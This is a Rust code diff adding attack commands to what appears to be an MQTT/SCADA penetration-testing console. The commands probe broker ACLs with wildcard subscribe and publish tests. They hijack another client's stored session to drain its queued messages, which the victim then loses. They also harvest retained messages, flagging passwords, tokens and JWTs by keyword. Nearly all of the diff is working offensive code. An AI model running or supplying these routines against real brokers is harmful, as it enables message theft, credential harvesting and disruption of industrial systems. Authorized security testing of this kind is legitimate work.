@@ -298,6 +298,9 @@ fn messaging_console(cs: &ConnState, mut session: MqttSession) -> Result<()> {
                 println!();
                 return Ok(());
             }
+            "acl" => handle_acl_cmd(&mut session, &topic_stats, rest),
+            "session" => handle_session_cmd(cs, rest),
+            "retain" => handle_retain_cmd(&mut session, rest),
             "help" | "?" => print_msg_help(),
             "exit" | "quit" => {
                 let _ = session.disconnect();
@@ -643,6 +646,214 @@ fn matches_filter(msg: &MqttMessage, filter: &str) -> bool {
     msg.topic.to_lowercase().contains(&f) || msg.payload_str().to_lowercase().contains(&f)
 }
 
+fn handle_acl_cmd(
+    session: &mut MqttSession,
+    topic_stats: &HashMap<String, usize>,
+    args: &str,
+) {
+    let base_topics: Vec<String> = if args.is_empty() {
+        let mut by_count: Vec<(&String, &usize)> = topic_stats.iter().collect();
+        by_count.sort_by(|a, b| b.1.cmp(a.1));
+        by_count.iter().take(8).map(|(t, _)| (*t).clone()).collect()
+    } else {
+        vec![args.to_string()]
+    };
+
+    if base_topics.is_empty() {
+        println!("  no topics to probe — receive some traffic first, or provide a topic arg");
+        return;
+    }
+
+    println!("  ACL probe — wildcard subscribe + publish tests (authorized use only)");
+    println!("  {:<54} access", "variant");
+    println!("  {}", "─".repeat(70));
+
+    let mut tested: std::collections::HashSet<String> = std::collections::HashSet::new();
+    'outer: for base in &base_topics {
+        if base_topics.len() > 1 {
+            println!("  base: {base}");
+        }
+        for variant in acl_variants(base) {
+            if tested.len() >= 20 {
+                println!("  [limit] max 20 variants reached.");
+                break 'outer;
+            }
+            if !tested.insert(variant.clone()) {
+                continue;
+            }
+
+            let sub_ok = session.subscribe(&variant, 0).is_ok();
+            let rx_count = if sub_ok {
+                let deadline = std::time::Instant::now() + Duration::from_millis(800);
+                let mut n = 0usize;
+                while std::time::Instant::now() < deadline {
+                    n += session.drain_messages().len();
+                    thread::sleep(Duration::from_millis(50));
+                }
+                let _ = session.unsubscribe(&variant);
+                n
+            } else {
+                0
+            };
+            let pub_ok = session.publish(&variant, b"scadaver/acl-probe", 0, false).is_ok();
+            let sub_label = if sub_ok {
+                format!("SUB:YES({rx_count})")
+            } else {
+                "SUB:NO    ".to_string()
+            };
+            let pub_label = if pub_ok { "PUB:YES" } else { "PUB:NO " };
+            println!("  [{sub_label:<12} {pub_label}]  {variant}");
+        }
+    }
+    println!("  {} variant(s) tested.", tested.len());
+}
+
+fn acl_variants(topic: &str) -> Vec<String> {
+    let parts: Vec<&str> = topic.split('/').collect();
+    let mut out = Vec::new();
+
+    out.push(topic.to_string());
+
+    for i in 0..parts.len() {
+        let mut v = parts.clone();
+        v[i] = "+";
+        out.push(v.join("/"));
+    }
+
+    for depth in 0..=parts.len() {
+        let v = if depth == 0 {
+            "#".to_string()
+        } else {
+            format!("{}/#", parts[..depth].join("/"))
+        };
+        out.push(v);
+    }
+
+    let mut seen = std::collections::HashSet::new();
+    out.retain(|v| seen.insert(v.clone()));
+    out
+}
+
+fn handle_session_cmd(cs: &ConnState, args: &str) {
+    let mut parts = args.splitn(2, ' ');
+    let clientid = if let Some(id) = parts.next().filter(|s| !s.is_empty()) {
+        id.to_string()
+    } else {
+        println!("  usage: session <clientid> [secs]");
+        println!("         Reconnects as <clientid> with clean_session=false to steal queued messages.");
+        return;
+    };
+    let secs: u64 = parts.next().and_then(|s| s.parse().ok()).unwrap_or(5);
+
+    println!("  [*] Session hijack — connecting as '{clientid}' (clean_session=false)...");
+    let opts = ConnectOptions {
+        host: cs.host.clone(),
+        port: cs.port,
+        client_id: clientid.clone(),
+        keepalive: 30,
+        clean_session: false,
+        username: cs.username.clone(),
+        password: cs.password.clone(),
+        will: None,
+    };
+
+    let mut hijack = match MqttSession::connect(&opts) {
+        Ok(s) => {
+            let state = if s.session_present {
+                "YES — stored session resumed (queued messages incoming)"
+            } else {
+                "NO  — fresh session (victim stored session wiped)"
+            };
+            println!("  [+] Connected. Session present: {state}");
+            s
+        }
+        Err(e) => {
+            println!("  [-] Connection failed: {e:#}");
+            return;
+        }
+    };
+
+    if let Err(e) = hijack.subscribe("#", 1) {
+        println!("  [!] Subscribe '#' QoS 1 failed: {e:#}");
+    }
+
+    println!("  [*] Draining for {secs}s...");
+    let deadline = std::time::Instant::now() + Duration::from_secs(secs);
+    let mut total = 0usize;
+    let mut unique: std::collections::HashSet<String> = std::collections::HashSet::new();
+
+    while std::time::Instant::now() < deadline {
+        for msg in hijack.drain_messages() {
+            total += 1;
+            unique.insert(msg.topic.clone());
+            let (fmt, display) = detect_payload(&msg.topic, &msg.payload);
+            let tag = if msg.retain { "R" } else { "Q" };
+            println!("  [{tag}] {} : {}  [{fmt}]", msg.topic, display);
+        }
+        thread::sleep(Duration::from_millis(50));
+    }
+    let _ = hijack.disconnect();
+
+    println!();
+    println!("  Session hijack summary:");
+    println!("    Messages captured : {total}");
+    println!("    Unique topics     : {}", unique.len());
+    if total == 0 {
+        println!("    Note: 0 messages — broker may enforce strict clean_session or no queued traffic.");
+    } else {
+        println!("    Note: captured traffic was delivered HERE; original owner will miss it.");
+    }
+}
+
+fn handle_retain_cmd(session: &mut MqttSession, args: &str) {
+    let secs: u64 = args.parse().unwrap_or(8);
+    println!("  [*] Hunting retained messages for {secs}s...");
+    let _ = session.subscribe("#", 0);
+
+    let deadline = std::time::Instant::now() + Duration::from_secs(secs);
+    let mut retained_count = 0usize;
+    let mut sensitive_count = 0usize;
+
+    while std::time::Instant::now() < deadline {
+        for msg in session.drain_messages() {
+            if !msg.retain {
+                continue;
+            }
+            retained_count += 1;
+            let (fmt, display) = detect_payload(&msg.topic, &msg.payload);
+            let sensitive = payload_is_sensitive(&display, &msg.topic);
+            if sensitive {
+                sensitive_count += 1;
+            }
+            let flag = if sensitive { "[SENSITIVE]" } else { "[         ]" };
+            println!("  {flag}  {} : {}  [{fmt}]", msg.topic, display);
+        }
+        thread::sleep(Duration::from_millis(50));
+    }
+
+    println!();
+    println!("  Retain hunt complete: {retained_count} retained topic(s), {sensitive_count} flagged sensitive.");
+}
+
+fn payload_is_sensitive(display: &str, topic: &str) -> bool {
+    if display.contains("eyJ") {
+        return true; // JWT header (base64 encoded `{`)
+    }
+    let haystack = format!("{} {}", display.to_lowercase(), topic.to_lowercase());
+    for kw in &["password", "passwd", "secret", "token", "credential", "apikey", "api_key"] {
+        if haystack.contains(kw) {
+            return true;
+        }
+    }
+    let dot_parts: Vec<&str> = display.split('.').collect();
+    if dot_parts.len() == 4
+        && dot_parts.iter().all(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_digit()))
+    {
+        return true;
+    }
+    false
+}
+
 fn detect_payload(topic: &str, payload: &[u8]) -> (&'static str, String) {
     if topic.starts_with("spBv1.0/") || topic.starts_with("spAv1.0/") {
         let hex: String = payload.iter().map(|b| format!("{b:02x}")).collect::<Vec<_>>().join(" ");
@@ -745,6 +956,9 @@ fn print_msg_help() {
     println!("    sys                        subscribe to $SYS/# and display broker statistics");
     println!("    creds [user:pass]          test default MQTT credentials (or one specific pair)");
     println!("    spfuzz [options]           Sparkplug B fuzzer (run --dry-run first! see 'spfuzz help')");
+    println!("    acl [topic]                test wildcard ACL bypass (subscribe + publish probes)");
+    println!("    session <clientid> [secs]  hijack ClientID stored session, drain queued messages");
+    println!("    retain [secs]              hunt retained payloads, flag credentials/tokens");
     println!("    ping                       send PINGREQ");
     println!("    disconnect                 disconnect and return to connection console");
     println!("    exit / quit                disconnect and exit shell");
